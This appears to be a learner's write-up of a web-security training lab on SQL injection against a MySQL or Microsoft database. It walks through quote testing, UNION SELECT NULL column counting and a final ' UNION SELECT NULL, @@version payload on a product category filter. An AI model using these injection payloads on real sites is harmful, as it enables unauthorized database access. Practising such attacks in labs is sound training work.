# 🧠 Lab Title: SQL injection attack, querying the database type and version on MySQL and Microsoft

## 🔍 Category
SQLI

## 🎯 Objective
> Display the database version string.

## 🧰 Tools Used
- Notepad

## 🚀 Exploitation Steps
#### Observe the description
> Before diving into the lab, we’re told it's using an MySQL or Microsoft database, its randomized.
**What does that means? and what why would we care?** well , knowning the type of the database will help us minimizing the attack surface , for example if we are planning to attack a Oracle databse we would use Oracle database statements (like this UNION SELECT NULL FROM DUAL --) Its different from MySQL which we will do
```sql
UNION SELECT NULL --
```
so what will we use? based on this [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) we will do it like this

```sql
' UNION SELECT @@version -- ;
```
and of course the vulnerability is in the product category

#### Access the lab
> Click on `ACCESS THE LAB`

#### START HACKING!!!
1) image the query 
```sql
SELECT * FROM products WHERE category = '';
```

2) Test with '

3) We got 500 , good now lets determine how much tables are in there

4) 
```sql
' UNION SELECT NULL -- ;
```
we got 500 , lets try another NULL 

```sql
' UNION SELECT NULL,NULL -- ;
```
Why we leave space and put a ; ?
1) Because the syntax of MySQL and Microsfot in comments is that way
2) We put ; to end the statement

okay now lets build our payload 

5) 
```sql
' UNION SELECT NULL , @@version -- ;
```
### 4. Proof of Success
- We can see the database version

## 🧵 Reflection
> What is the syntax of the MySQL and Microsoft databases? \
> How to retrieve the version of the database of the MySQL and Microsoft databases?
